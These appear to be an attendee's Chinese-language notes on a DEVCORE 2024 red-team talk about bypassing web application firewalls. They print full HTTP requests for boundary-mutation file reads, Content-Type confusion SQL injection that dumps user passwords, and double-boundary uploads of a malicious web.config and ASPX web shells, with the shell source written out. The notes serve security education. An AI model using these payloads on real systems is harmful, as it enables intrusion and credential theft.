---
title: "DEVCORE CONFERENCE 2024 「牆の調查：致 WAF 前的你」 (Mico)"
date: 2025-11-17
author: "CHW"
tags:
  - techtalks
description: "WAF 作為一種已臻於成熟的技術產品，不僅是抵禦網路威脅的高壘深塹，其發展速度也猶如是向紅隊發出了挑戰。本議程將回顧早期的繞過技巧，以及介紹至今紅隊專家如何鑿壁偷光？議程中將簡單解析 WAF 的基本原理，探討紅隊如何在實際情況中，成功讓關鍵請求繞過這些安全措施。亦會分享一些從實戰中提煉出的經驗，包括那些起初看似不可能繞過，卻屢屢成功實現的真實案例。..."
---

DEVCORE CONFERENCE 2024 「牆の調查：致 WAF 前的你」 (Mico)
===

# Table of Contents

[TOC]

# Conference Info
**Conference Title**: DEVCORE CONFERENCE 2024\
**Date**: 2024.03.16\
**Location**: TICC 台北國際會議中心 201 會議室（台北市信義區信義路五段 1 號）

**Presentation Title**: 牆の調查：致 WAF 前的你\
**Speaker**: 高敏睿 (Mico) ｜ DEVCORE 資深紅隊演練專家\
**Description**:\
>"WAF" 作為一種已臻於成熟的技術產品，不僅是抵禦網路威脅的高壘深塹，其發展速度也猶如是向紅隊發出了挑戰。本議程將回顧早期的繞過技巧，以及介紹至今紅隊專家如何鑿壁偷光？議程中將簡單解析 WAF 的基本原理，探討紅隊如何在實際情況中，成功讓關鍵請求繞過這些安全措施。亦會分享一些從實戰中提煉出的經驗，包括那些起初看似不可能繞過，卻屢屢成功實現的真實案例。最後將從戴夫寇爾視角總結 WAF 在當今網路安全生態中的地位和效力。

附上這次 conference 很有收穫的一句話：\
![image](https://hackmd.io/_uploads/rJQLZ_hNkx.png)


# Presentation Technical Content
>[!Note]
> 內容也包含自己不太懂，上網 research 的補充知識

## HTTP Request
- Request Line
- Header
- Empty Line
- Message Body
- multipart/form-data
    ![image](https://hackmd.io/_uploads/HyUsPdd41l.png)
    > 用途: 可以傳送 multipart 的資料（如文字與檔案）給 Server，透過一次 request 傳送多種資料類型
    - format
    ```css
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<隨機字串>
    ```
    >-- `boundary`:
    用來分隔不同 part 的資料，以 `--boundary` 開頭，最後用 `-boundary--` 結束。\
    -- `Content-Disposition`: \
    定義該 part 是表單欄位還是檔案\
    -- `WebKitFormBoundary`: \
    [webkit engine](https://zh.wikipedia.org/zh-tw/WebKit)（如 Chrome、Safari）生成的 boundary 標記。
    >> 《沒那麽簡單》黃小琥 (Tiger Huang):\
    >> 一杯紅酒配電影\
    >> 在周末晚上 關上了手機 
    >> 舒服窩在 **Safari**

## boundary 可以簡化
![image](https://hackmd.io/_uploads/Sku8Jt_V1g.png)

將 boundary 自 `----WebKitFormBoundarysNcHQhF5wOWC21z5`簡化成 `x`

## WAF 處理流程
![image](https://hackmd.io/_uploads/HyGnNo9NJe.png)
![image](https://hackmd.io/_uploads/r15nN2cNke.png)

### 請求進入
Client 發送 HTTP/HTTPS (GET、POST 等)，帶 URL、表單數據、JSON 或其他有效負載

### 預處理
http/s 封包判別: 
- 加密的流量（如 HTTPS）解密為的明文內容
- 檢查請求是 HTTP 還是 HTTPS，確保流量格式正確

### 解析
- 分析請求的整體結構
- 去除冗餘字串元、編碼還原（如 URL decode）
- 處理 multipart boundary 或 Chunked 內容

![image](https://hackmd.io/_uploads/BJiPWzs4Je.png)
    -  在請求路徑 /download.aspx 和 index.aspx "合理"
    -  Referer Header 來自 devcore.re/index.aspx "合理"
    -  Content-Disposition Ｈeader，檔案名稱出現 download.aspx "可疑"
> 1. `.aspx` 是 ASP.NET 的可執行網頁檔，可以透過上傳注入 Web Shell 達到 RCE，例如：`/uploads/download.aspx?cmd=whoami`
> 2. 檔案上傳類型常見圖片、文件等，.aspx 可執行檔案格式不常見。
> 

### 稽核輸入
#### WAF 稽核、種類
![image](https://hackmd.io/_uploads/BkbqrzsNkg.png)

- Key word、Regular expression
針對特定關鍵字或使用正規表達式過濾惡意內容。例如偵測 SQLi 關鍵字 `UNION`, `SELECT`, `DROP`等等
- Rate Limit
限制單位時間內同一個來源發送的請求數量，防止 DoS 或 Brute-force 等等
- 大小限制
設定檔案上傳的大小限制，避免 Server 資源耗盡，防止大量檔案上傳攻擊 或 Buffer Overflow 
- 地理限制
根據 IP 的地理位置限制存取，利用 VPN 或 Proxy Server 等

- Machine Learning
透過 AI Model 分析流量行為，偵測 user behavior 或新的攻擊模式

#### WAF 阻擋手段
- 封鎖 IP
- 回首頁
- 顯示阻擋頁面
>[!Note]
>若阻擋頁面為預設畫面，可以透過阻擋頁面去猜測 Server 端使用的 WAF 廠牌

### 轉送後端

## 夢回 2009 繞 WAF
### 2009 案例 I
`id=1' and 1=1#`
利用 SQL 註解語法與空格的混淆來繞過 WAF
> Key word、Regular expression

![image](https://hackmd.io/_uploads/rJB1WfnNJx.png)
`id=1'/**/and/**/1/**/=/**/1/**/#`
在 SQL 中查詢：
```sql
SELECT * FROM users WHERE id='1' /**/and/**/1/**/=/**/1/**/#;
```
經過 SqlParser結果：
```sql
SELECT * FROM users WHERE id='1' AND 1=1;
```

### 2009 案例 II
`content=<img src1 error=alert()>`

![image](https://hackmd.io/_uploads/rJK_Nz2Vyx.png)

URL encode 3 次
```
content=%25%32%35%25%33%33%25%36%33%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%34%25%32%35.........％33%32%25%33%39%25%32%35%25%33%33%25%36%35
```
### 2009 案例 III
`id=1' and 1=1#`

![image](https://hackmd.io/_uploads/S1KbX7hEyl.png)
修改 Content-Type，讓 WAF 無法識別 request，達到繞過 WAF 的檢查。\
>檢查流程：\
首先檢查 HTTP 請求的方法是否為 POST，再確認 Message Body 類性: Content-Type == application/x-www-form-urlencoded。

那如果刪除 Header ?!!
## WAF 繞過技巧
- 語言特性
MySQL:
![image](https://hackmd.io/_uploads/HJgaAXhVyx.png)
> 1. 單引號閉合
> 2. 註解 /**/ 代替空格，Bypass WAF 偵測關鍵字
> 3. 大小寫
> 4. 特殊字元、符號

- 作業系統、網頁伺服器
![image](https://hackmd.io/_uploads/H1KvZE2Vyg.png)
> 1. php bypass file extensions checks ([HackTricks/file-upload](https://book.hacktricks.xyz/pentesting-web/file-upload))
> 2. MIME data encode
> > 2.1 `filename*=utf7''shell.php`: UTF-7 混淆''，不影響 shell.php\
> > 2.2 `filename="=?utf8?b?c2hlbGwucGhw?="`\
> > `=?utf8?b?`: 使用 UTF-8，b 表示 Base64 encode\
> >  `c2hlbGwucGhw`(Base64 decode): shell.php
> 3. [NTFS](https://en.wikipedia.org/wiki/NTFS)（New Technology File System）: `::$DATA` 預設資料流的類型
- 前後端解析不一致
- 其他 (參數過多、長度過長、找真實 IP 地址等等)

## 近兩年實戰案例
![image](https://hackmd.io/_uploads/B1fXP4nNkg.png)
### 繞過案例 (一): Boundary Mutation - 任意讀檔
![image](https://hackmd.io/_uploads/ryQquV3Nke.png)
1. 在 multipart boundary path 中測試路徑: 200 OK
2. `./upload/../upload/` 測試相同路徑，但 ../ 被 WAF 檔掉
3. 但在 boundary 外加入黑名單 key word (../): 200 OK
```request
POST /download.php HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="path"; 

./upload/ 
--x 
Content-Disposition: form-data; name="file"; 

s101.pdf 
--x-- 
/../ #boundary 外
```
4. Boundary Mutation: 200 OK
>[!Note]
> 針對 boundary 進行變異:
> 1. 加入 \0（空字元）、空格或換行: `------WebKitFormBoundary12345\0`
> 2. 增加 boundary 外的前後字串: `boundary="----WebKitFormBoundary12345"`
> 3. 透過 URL encode、UTF-7 或其他編碼: `boundary=----%57ebKitFormBoundary12345`

```request
POST /download.php HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x\0
Content-Disposition: form-data; name="path"; 

./upload/../upload/
--x\0 
Content-Disposition: form-data; name="file"; 

s101.pdf 
--x-- 
```
5. 嘗試讀檔
![image](https://hackmd.io/_uploads/HJOrnIh4kg.png)

6. 路徑再塞入 null byte
```request
POST /download.php HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x\0
Content-Disposition: form-data; name="path"; 

../download.php\0
--x\0 
Content-Disposition: form-data; name="file"; 

s101.pdf 
--x-- 
```
![image](https://hackmd.io/_uploads/SkzQT83E1g.png)

### 繞過案例 (二): Content-Type Confusion - SQLi
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded
Content-Length: (auto) 
 
action=search&query=DEVCORE
```
1. 針對 Ｑuery 注入，但單引號(`'`)伺服器回應500
2. 兩個單引號(`'` `'`) 200 OK，但查無結果
3. 兩個單引號(`'||'`) 200 OK，且結果正確
![image](https://hackmd.io/_uploads/BJ0ERU2Vye.png)

4. 嘗試 `' order by 1 --` 403 WAF 阻擋
5. 嘗試 `' or` 403 WAF 阻擋
![image](https://hackmd.io/_uploads/H19NkwnNke.png)
> or 會被阻擋

>[!Important]
> 經驗值+1
> 推測：`/'.*(or|select|-- ..)/`

6. 再塞入一個參數，仍會變被 WAF 偵測到
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded
Content-Length: (auto) 
 
action=search&query=DEVCORE&xx'&orxx
```
7. 單引號再塞入一個參數 200 OK，且結果正確
![image](https://hackmd.io/_uploads/ry9tlv34Jx.png)
8. Header 中塞入黑名單，測試 WAF 會不會偵測: 200 OK，且結果正確
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded
Foo: xx'orxx
Content-Length: (auto) 
 
action=search&query=DEVCORE
```
9. multipart/form-data: 200 OK，且結果正確
```request
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query" 

DEVCORE 
--x--
```
10. query 加入黑名單，測試 WAF 會不會偵測到: 會
![image](https://hackmd.io/_uploads/SktmzP3Eyg.png)
11. 嘗試加入 file type: 403 WAF 阻擋
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; filename="x.jpg"

DEVCORE'or 
--x--
```

12. 塞在 Header 參數外: 403 WAF 阻擋
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; 'or

DEVCORE 
--x--
```

13. 嘗試加入 Content-Type: 200 OK，且結果正確
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; 'or
Content-Type: image/jpeg

DEVCORE 
--x--
```
14. Content-Type嘗試成功，那塞入黑名單: 200 OK，且結果正確
![image](https://hackmd.io/_uploads/ByZf4w34ye.png)
15. 更改 multipart 的 Content-Type: 200 OK，且結果正確
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded; multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; 'or
Content-Type: image/jpeg

DEVCORE 
--x--
```
>[!Caution]
> Server & WAF 看得不一樣：
> - 在伺服器還是會優先解析 `application/x-www-form-urlencoded`，而非`multipart/form-data`
> - 針對 WAF 會誤認為整體 request 是 `multipart/form-data`，因此不會去檢查到 multipart 的參數或內容
> ![image](https://hackmd.io/_uploads/Bk2fMcZB1x.png)


16. 將 payload 塞入 header: 200 OK，且結果正確
![image](https://hackmd.io/_uploads/rJLE8vnNJe.png)
>[!Important]
> 為什麼 Server 可以執行 query? ~~但 WAF 看不見(上面已解釋)~~ 
> > 當伺服器因為 Content-Type priority 解析 由左至右第一個 `application/x-www-form-urlencoded;`來提取內容。
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded; multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; 'or
Content-Type: image/jpeg&action=search&query=DEVCORE

DEVCORE 
--x--
```
> `&action=search&query=DEVCORE`
> WAF 會誤以爲是正常form header\
> 但**後端會認為是 query string**

17. 驗證後段認為是 query string: 伺服器回應500
![image](https://hackmd.io/_uploads/BJTTwDhEJe.png)

18. 後段驗證成功，塞入 sqli payload: 200 OK，成功注入
```HTTP
POST /action HTTP/1.1 
Host: devco.re 
Content-Type: application/x-www-form-urlencoded; multipart/form-data; boundary=x 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="action" 

search 
--x 
Content-Disposition: form-data; name="query"; 'or
Content-Type: image/jpeg&action=search&query=DEVCORE' union select null, null, email, passwd from users --

DEVCORE 
--x--
```
![image](https://hackmd.io/_uploads/HyvC2D34yl.png)

### 繞過案例 (三): Form Header Confusion & Content-Type Confusion - File upload
已知上傳路徑不可執行 aspx，任意檔案上傳 (web.config、ASPX Web Shell)
>[!Note]
> 針對 IIS Server:\
> (1) `web.config` 是 IIS 伺服器上的設定檔案，使用 XML 格式來設定應用程式的行為。\
> (2) `ASPX Web Shell` ASPX 是 IIS 伺服器支援的動態網頁格式，由 ASP.NET 解析並執行。ASPX Web Shell 在伺服器上執行命令、控制主機。\
> 常見 Web Shell：
> ```
> <%@ Page Language="C#" Debug="true" %>
><% 
>System.Diagnostics.ProcessStartInfo psi = new >System.Diagnostics.ProcessStartInfo();
>psi.FileName = "cmd.exe";
>psi.Arguments = "/c " + Request.QueryString["cmd"];
>psi.UseShellExecute = false;
>psi.RedirectStandardOutput = true;
>System.Diagnostics.Process proc = >System.Diagnostics.Process.Start(psi);
>string output = proc.StandardOutput.ReadToEnd();
>Response.Write("<pre>" + output + "</pre>");
>%>
> ```


![image](https://hackmd.io/_uploads/Hk7ogXpE1g.png)
1. 測試 WAF 會偵測的地方，上傳路徑更改為**不存在的路徑**，避免上傳成功覆蓋到原始資料
```request
POST /does_not_exist HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="file"; filename="1.txt"; 
Content-Type: text/plain 

DEVCORE 
--x--
```

2. 測試 WAF 阻擋的地方與規則_Content-Disposition
>[!Tip]
> 因已將路徑改成不存在路徑\
> 代表 (1) 403 WAF 阻擋 (2) 404 有過

- `filename="web.config";` 403 WAF 阻擋
- `filename="Xweb.config";` 字元+黑名單 403 WAF 阻擋
- `filename="Xweb.configX";` 字元+黑名單+字元 403 WAF 阻擋
- `filename="Xweb. configX";` 黑名單+空格，404 有過
- `filename="XX"; web.config` 黑名單丟到參數外，404 有過

3. 測試 WAF 阻擋的地方與規則_Content-Type: 404 有過
![image](https://hackmd.io/_uploads/rJSbA7TV1e.png)

4. 測試 WAF 阻擋的地方與規則_Form Content: 403 WAF 阻擋
```request
POST /does_not_exist HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="file"; filename="XX"; 
Content-Type: text/plain 

DEVweb.configCORE 
--x--
```
5. 測試 WAF 阻擋的地方與規則_boundary外
- 黑名單: 403 WAF 阻擋 
```request
POST /does_not_exist HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="file"; filename="XX"; 
Content-Type: text/plain 

DEVCORE 
--x--
web.config
```
- 塞垃圾: 403 WAF 阻擋
```request
POST /does_not_exist HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="file"; filename="XX"; 
Content-Type: text/plain 

DEVCORE 
--x--
foo
```
#### Double Boundary 測試 WAF
1. 找個回顯的測試頁面，確保結果正確
![image](https://hackmd.io/_uploads/B1Q3JVaV1x.png)
2. 測試正常 Double Boundary: 403 WAF 阻擋
```request
POST /echo.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; boundary=y; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="msg" 
Content-Type: text/plain 

1 
--x--
```

3. 第一個 Boundary 改成大寫: 403 WAF 阻擋
```request
POST /echo.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; BOUNDARY=x; boundary=y; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="msg" 
Content-Type: text/plain 

1 
--x--
```

4. 第二個 Boundary 改成大寫: 200 OK
```request
POST /echo.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; BOUNDARY=y; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="msg" 
Content-Type: text/plain 

1 
--x--
```
> Bypass WAF 後，測試 Server 可以識別的其他方式

5. Boundary 前後對調: 伺服器回應 500
```request
POST /echo.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; BOUNDARY=y;boundary=x;  
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="msg" 
Content-Type: text/plain 

1 
--x--
```
> 代表 WAF bypass，但 Server 也無法識別\

![image](https://hackmd.io/_uploads/ByHLfNpEyg.png)
> 以上測試 WAF 與 Server 識別 Content-Type 結果

#### Double Boundary 測試 Server 識別 Message Body
- x 包覆 y
![image](https://hackmd.io/_uploads/B1h0XEp41e.png)
![image](https://hackmd.io/_uploads/Sk8vrVaVyl.png)

> WAF 將 boundary y 誤認為 Content\
> 但 Server 能夠識別 boundary y
> 且接受 boundary 外有垃圾

>[!Caution]
> 為什麼 WAF 只吃 x 不吃 y ? 
> - 以上述測試表格顯示: WAF 只能識別 `第一個 boundary 參數` 且另一個  需要大寫 BOUNDARY y 才能 bypass block
> (因為是 content boundary `--x` 開頭，所以 WAF 只識別第一個參數 boundary x)
> 
> 為什麼 Server 只吃 y 不吃 x ?
> - 依照Content-Type Header 規範`不允許多個 boundary 同時存在`，當 boundary 被多次定義時，後端解析器通常會直接採用最後出現的值（boundary=y）

![image](https://hackmd.io/_uploads/Hkn3yraEke.png)

#### 定義完各自的世界觀，開始測試 payload
1. 使用前面 [Content-Disposition 的 trick](#繞過案例-三-Form-Header-Confusion-amp-Content-Type-Confusion---File-upload) (`filename="XX"; web.config` 黑名單丟到參數外，404 有過)，在 Content-Disposition 塞入 
> 1. `filename="1.txt";` 200 OK
> 2. `x=filename="1.txt";web.config` 200 OK
> 3. 結合: `x=filename="1;/../web.config"` 200 OK
![image](https://hackmd.io/_uploads/BkC3mraE1e.png)


>[!Note]
> WAF 世界觀: `x=filename="1;`~~/../web.config"~~
> Server 世界觀: ~~x=~~`filename="1;/../web.config"`

2. 上傳完整 web.config
```request
POST /upload.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="file"; x=filename="1;/../web.config" 
Content-Type: text/plain 

<?xml version="1.0"?> 
<configuration> 
    <system.webServer> 
        <security> 
            <requestFiltering allowDoubleEscaping="true" /> 
        </security> 
        <handlers accessPolicy="Read, Execute" /> 
    </system.webServer> 
</configuration> 
--x--
```
> (1) `<requestFiltering allowDoubleEscaping="true" />`: 啟用雙重編碼（例如 %252E 會被解碼成 %2E 再解碼成 .），可繞過 URL 過濾規則。
> (2) `<handlers accessPolicy="Read, Execute" />`: 設定 Server 允許執行檔案的權限，可能上傳執行惡意腳本。


3. 上傳完整 Web Shell: 403 WAF 阻擋
![image](https://hackmd.io/_uploads/Hy-2PSa4kl.png)
![image](https://hackmd.io/_uploads/rJv1dSTVkl.png)

4. 使用上述 Double Boundary 的特性
```request
POST /upload.aspx HTTP/1.1 
Host: devco.re 
Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 
Content-Length: (auto) 

--x 
Content-Disposition: form-data; name="x"; 

1 
--x 
--y: 
Content-Disposition: form-data; name="file"; x=filename="1;/../shell.aspx"; 

--x 
Content-Disposition: form-data; name="foo"; 
Content-Type: <%@ Page Language="Jscript"%><%eval(Request.Item["x"],"unsafe");%> 

--y:-- 
--x--
```
>[!Important]
> Server 世界觀：\
> ![image](https://hackmd.io/_uploads/Hk2A_rTVyx.png)
> WAF 世界觀：\
> ![image](https://hackmd.io/_uploads/Hyy-KS64Je.png)
> WAF 認為：
> 1. `--y:` 是 x form 中，沒 value 的 header
> 2. `Content-Disposition: form-data; name="file"; x=filename="1;/../shell.aspx";` 仍然是 x form 裡面的 header
> 3. Web Shell 在 Content-Type 不會被擋，可成功上傳 Shell 內容

![image](https://hackmd.io/_uploads/rkPl9HTNke.png)

## 總結
![image](https://hackmd.io/_uploads/r1Cm9S6N1l.png)
### 致紅隊
![image](https://hackmd.io/_uploads/B1nn9BTNJl.png)

### 致藍隊
![image](https://hackmd.io/_uploads/r1WyjSTN1l.png)


# Personal Reflections
![image](https://hackmd.io/_uploads/S10fcI6EJl.png)

這次 Mico 的技術分享，\
在思維方面：
1. 先了解防禦機制的處理流程
2. 將防禦偵測機制分類，透過各個類別有邏輯的去嘗試
3. 依據回應內容判斷 WAF 與 Server之間的關係
4. payload 注入的點，根據 server response 有脈絡的分析可行性
5. 「畢竟前後端點本身就不一樣」，這個觀點讓我對 Bypass 各種防禦機制更感興趣

在技術方面：
1. 「夢回 2009 繞 WAF」Review 了 Sqli, XSS 與各種 bypass 技巧
2. 之前針對 multipart data，只有針對 Content 塞東西。透過這次學習到:
    2.1 boundary mutation\
    2.2 新增 Header 或 Header 參數，測試 bypass WAF\
    2.3 Content-Disposition、Content-Type 塞入 query\
    2.4 Boundary 外也能丟東西\
    2.5 第一次知道 Double Boundary 的用法
3. 拆解 WAF視野 與 Server視野

###### tags: `devcore` `conference` `2024` `red team` `offensive security`
